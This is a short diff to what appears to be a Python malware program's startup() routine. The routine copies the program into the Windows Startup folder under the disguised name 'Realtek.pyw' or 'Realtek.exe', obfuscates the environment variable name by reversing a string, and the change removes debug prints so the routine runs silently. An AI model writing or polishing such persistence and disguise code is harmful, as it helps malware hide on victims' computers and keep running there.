@@ -338,12 +338,10 @@ def startup():
         else:
             path = __file__
         
-        print(path)
         startuppath = f"{os.getenv(f'{apppp[::-1]}')}\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Realtek.pyw"
         if not isfile(startuppath):
             if ".py" in path:
                 copy(path, startuppath)
-                print('copied')
             else:
                 startuppath = f"{os.getenv(f'{apppp[::-1]}')}\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Realtek.exe"
                 copy(path, startuppath)
